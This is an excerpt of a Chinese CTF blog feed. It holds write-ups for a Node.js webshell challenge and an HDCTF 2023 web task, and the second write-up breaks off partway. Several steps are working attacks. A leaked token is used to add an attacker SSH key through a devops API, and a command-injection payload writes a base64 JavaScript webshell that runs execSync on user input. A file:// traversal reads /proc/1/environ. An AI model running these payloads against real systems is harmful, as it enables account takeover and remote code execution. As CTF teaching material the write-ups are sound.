class="string">&quot;https://fastly.jsdelivr.net/npm/axios@0.21.1/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/projectList&#x27;</span>)</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/versionList&#x27;</span>, &#123;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distList&#x27;</span>, &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distExist&#x27;</span>, &#123;</span><br></pre></td></tr></table></figure><p>一共 4 个 api </p><blockquote><p>无论是哪个 api 你都可以进行跟踪</p></blockquote><p>例如第二个 api <code>/v2/coding/versionList</code> 所在的位置根据上面 middleware/api 的推断</p><p>可以发现放在了如下的位置</p><blockquote><p>喜欢写注释真是好程序员 (确信)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v2/coding/versionList.js</span><br></pre></td></tr></table></figure><p>访问后我们可以得到如下的 js 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> coding = <span class="built_in">require</span>(<span class="string">&#x27;../../../request/coding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> distExtname = [</span><br><span class="line">    <span class="string">&#x27;.tgz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.exe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.dmg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.AppImage&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">get</span>(<span class="params">request, response</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">ProjectId</span> = <span class="title class_">Number</span>(request.<span class="property">params</span>.<span class="property">ProjectId</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> data = []</span><br><span class="line"><span class="comment">// post to 一个后端 </span></span><br><span class="line">        <span class="keyword">const</span> storeList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">            <span class="title class_">Action</span>: <span class="string">&#x27;DescribeProjectDepotInfoList&#x27;</span>,</span><br><span class="line">            <span class="title class_">ProjectId</span>,</span><br><span class="line">        &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">DepotData</span>.<span class="property">Depots</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> store <span class="keyword">of</span> storeList) &#123;</span><br><span class="line">            <span class="keyword">const</span> versionList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">                <span class="title class_">Action</span>: <span class="string">&#x27;DescribeGitReleases&#x27;</span>,</span><br><span class="line">                <span class="title class_">DepotId</span>: <span class="title class_">Number</span>(store.<span class="property">Id</span>),</span><br><span class="line">                <span class="title class_">Status</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageNumber</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageSize</span>: <span class="number">100</span>,</span><br><span class="line">            &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">ReleasePageList</span>.<span class="property">Releases</span></span><br><span class="line"></span><br><span class="line">            data = [...data, ...versionList]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">TagName</span> &lt; b.<span class="property">TagName</span> ? <span class="number">1</span> : -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">setData</span>(data)</span><br><span class="line">        response.<span class="title function_">success</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现他是另一个后端 api 的代理 而那个后端定义在 request/coding 中</p><h3 id="获得-token"><a href="#获得-token" class="headerlink" title="获得 token"></a>获得 token</h3><p>我们可以通过相对的路径得到 url </p><p>访问 <a href="http://127.0.0.1/request/coding.js">http://127.0.0.1/request/coding.js</a> 中获取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access Token</span></span><br><span class="line"><span class="keyword">const</span> codingToken = <span class="string">&#x27;token e(This_Is_real_Token)c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> coding = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;https://e.coding.net&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="title class_">Authorization</span>: codingToken,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = coding</span><br></pre></td></tr></table></figure><p>网上搜索 e.coding.net  发现是一个 devops 平台 具有相当的利用价值</p><p>同时这里也暴露了 对应的 Token</p><h3 id="接管用户账户"><a href="#接管用户账户" class="headerlink" title="接管用户账户"></a>接管用户账户</h3><p>进一步使用搜索引擎可以发现对应的 openapi 文档 <a href="https://coding.net/help/openapi">https://coding.net/help/openapi</a></p><blockquote><p>如果发现了项目 <a href="https://github.com/Esonhugh/tencent-coding-openapi/">https://github.com/Esonhugh/tencent-coding-openapi/</a></p><p>这里提供了非常方便的利用工具 可以一键列出项目和仓库 并且可以增加 ssh keys 只需要导入一个 api token 即可。</p></blockquote><p>发现是个人 api （token 开头）</p><p>列出项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeCodingProjects&quot;,</span></span><br><span class="line"><span class="string">  &quot;PageNumber&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;PageSize&quot;: 10</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_projects</span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:54 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10bcd5a9-7d9a-4a80-a1ec-e833d4c89d77&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;TotalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ProjectList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UpdatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;MaxMember&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;DisplayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak my git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wow! you got there! SuperCool man!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/static/project_icon/scenery-version-2-10.svg&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UserOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;StartDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;EndDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;IsDemo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProgramIds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>列出仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeProjectDepotInfoList&quot;,</span></span><br><span class="line"><span class="string">  &quot;ProjectId&quot;: 11414022</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_repos   </span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:00 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1b4dee8f-afce-4495-8e8b-d776c8097397&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DepotData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Depots&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">10467875</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;HttpsUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectId&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;SshUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@e.coding.net:vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;WebUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://vuln-git.coding.net/p/leak-token-leak-git/d/leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;VcsType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Got there!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157728000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;LastPushAt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Page&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalPage&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalRow&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>发现要登陆 尝试获取 sshkey</p><p>创建 sshkey</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;CreateSshKey&quot;,</span></span><br><span class="line"><span class="string">  &quot;Title&quot;: &quot;Hacker&quot;,</span></span><br><span class="line"><span class="string">  &quot;Content&quot;: &quot;ssh-rsa AAAA== rsatest&quot;,</span></span><br><span class="line"><span class="string">  &quot;ExpirationDate&quot;: &quot;9999-12-31&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py add_ssh_key sshkey.rsa</span><br></pre></td></tr></table></figure><p>成功后 <code>git clone git@e.coding.net:XXXXX/XXXX/XXXX.git</code></p><h3 id="项目源代码"><a href="#项目源代码" class="headerlink" title="项目源代码"></a>项目源代码</h3><p>进行审计。 把起来项目跑起来。</p><p>可以在 api 文件夹中找到一个 /v3/UpdateAllProduct.js 文件 这个文件也是可以使用的 api 在 html 主页中可以找到对应的文件泄漏。</p><p>存在命令注入的可能 注入非常的简单 projectName 之类的参数都可以注入 因为这些是直接拼接进去的。</p><blockquote><p>正式的题目环境应该是禁止反向 shell 连接出来的</p><p>第一种办法是纯粹的无回显的布尔命令注入</p><p>但是这里滥用一下代码中的存在的 js CGI 魔法 我们可以尝试写入一个 webshell js 来进行 Getshell </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use as curl</span></span><br><span class="line">curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \</span><br><span class="line">         -H &#x27;x-coding-event: ping1&#x27; \</span><br><span class="line">         -X POST -k \</span><br><span class="line">         --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python usage</span></span><br><span class="line">python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://nodejs-hack.cloud.eson.ninja replace your url 不要加 / 我的服务是禁止nodejs 外连其他服务 所以会导致内部的js的命令拼接执行时候的 curl 失效，导致一次 500 ，否则会返回服务正常更新的 json</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output like following</span></span><br><span class="line">ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">.....</span><br><span class="line">httpx.ReadTimeout: The read operation timed out</span><br></pre></td></tr></table></figure><p>其中 BASE64WEBSHELL 的值为 js webshell 的样本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const &#123; execSync &#125; = require(&#x27;child_process&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // API POST</span><br><span class="line">    async post(request, response) &#123;</span><br><span class="line">        // console.log(request.params)</span><br><span class="line">        artifactPkgName = request.params.artifactPkgName</span><br><span class="line">        // Save Path</span><br><span class="line">        const localDir = __dirname</span><br><span class="line">        // curl command</span><br><span class="line">        const curlCMD = artifactPkgName</span><br><span class="line">        // Create Path</span><br><span class="line">        fs.mkdirSync(localDir, &#123; recursive: true &#125;)</span><br><span class="line">        // download artificate</span><br><span class="line">        ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()</span><br><span class="line">        // Response</span><br><span class="line">        response.success(ResponseData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 pm2 会自动托管和加载 api 文件夹下的 js 文件 所以我们可以直接访问 webshell</p><p>webshell 链接地址为 <a href="https://127.0.0.1/v2/badWebShell">https://127.0.0.1/v2/badWebShell</a> 请求方式为 POST </p><p>POST Form 的内容为 ‘artifactPkgName={CMD}’</p><p>参考 check-shell 函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python ./digging-shell.py get_shell https://nodejs-hack.cloud.eson.ninja <span class="built_in">ls</span> <span class="comment"># replace ls as your command. and replace https://nodejs-hack.cloud.eson.ninja as your url and also no / behind.</span></span><br><span class="line">ic| <span class="built_in">command</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">ic| resp.status_code: 200</span><br><span class="line">badWebShell.js</span><br><span class="line">coding</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>拿到 webshell 之后 cat /flag 即可拿到 flag</p><blockquote><p>flag 是 mount 进入容器进程中的 不要放到 /app 目录下即可</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DAS4-你听说过-js-的-webshell-吗的解题思路&quot;&gt;&lt;a href=&quot;#DAS4-你听说过-js-的-webshell-吗的解题思路&quot; class=&quot;headerlink&quot; title=&quot;DAS4-你听说过 js 的 webshell 吗的解题思路&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HDCTF-2023-WEB</title>
    <link href="https://ke1nys.github.io/posts/5f20f300.html"/>
    <id>https://ke1nys.github.io/posts/5f20f300.html</id>
    <published>2023-04-23T06:25:11.000Z</published>
    <updated>2023-04-26T13:05:32.226Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这里的话是只记录自己不会的知识点</strong></p><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="../images/image-20230423142920377.png" alt="image-20230423142920377"></p><p>这是一个考点，考查的是yaml 的python反序列化</p><p><a href="https://xz.aliyun.com/t/7923">可以看看这篇文章来了解一下YAML</a></p><p><a href="https://xz.aliyun.com/t/11082#toc-11">Python反序列化漏洞分析</a></p><p>这里的话就是一共有三种python反序列化类型</p><p><strong>pickle YAML Marshal </strong> </p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="../images/image-20230423145759804.png" alt="image-20230423145759804"></p><p>这里的话有三个选项可以进去进行查看，然后点进Read something会发现他的url是可以进行文件读取的</p><p><img src="../images/image-20230423150002768.png" alt="image-20230423150002768"></p><p>于是进行尝试，这里的话直接读文件的是读取不了的，得需要用<code>file</code>伪协议来进行读取</p><p><img src="../images/image-20230423150317306.png" alt="image-20230423150317306"></p><p>成功进行读取</p><p>但是这里不知道flag名称，所以不能进行读取，但是能可以尝试读取一下环境变量</p><p><strong>那么这就是非预期解了</strong></p><p><img src="../images/image-20230423150830780.png" alt="image-20230423150830780"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node2.anna.nssctf.cn:28523/read?url=file:///../../../../../proc/1/environ</span><br></pre></td></tr></table></figure><p>这里<code>/proc/1/environ</code>的意思就是<strong>进程为1的环境变量</strong></p><p><code>/proc/x/envrion</code>这就是查看任意进程的环境变量的方法</p><p>查看进程   <code>ps aux</code></p><p><strong>a：显示当前终端下的所有进程信息，包括其他用户的进程。</strong></p><p><strong>u：使用以用户为主的格式输出进程信息。</strong></p><p><strong>x：显示当前用户在所有终端下的进程。</strong></p><p><strong>预期解</strong></p><p>​    </p><p><img src="../images/image-20230423151647481.png" alt="image-20230423151647481"></p><p>查看pwd发现当前目录是<code>/app</code>，于是尝试用刚才的方法进行<code>/app/app.py</code>源码的读取，因为直接<code>url/app.py</code>的话是读取不到的</p><p><img src="../images/image-20230423152137758.png" alt="image-20230423152137758"></p><p>正常读取的时候发现有正则过滤，于是查了一下</p><p><a href="https://www.cnblogs.com/xieshengsen/p/6727064.html">[正则表达式 re.findall 用法]</a></p><p>那么这里的话不成功是因为，这里匹配到url里的<code>app.*</code>，然后以app.*的数组形式返回，然后导致查不到结果，于是我们可以使用双重url编码绕过</p><p><img src="../images/image-20230423152629528.png" alt="image-20230423152629528"></p><p>双重url绕过后成功读取到了源码</p><p><strong>源码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 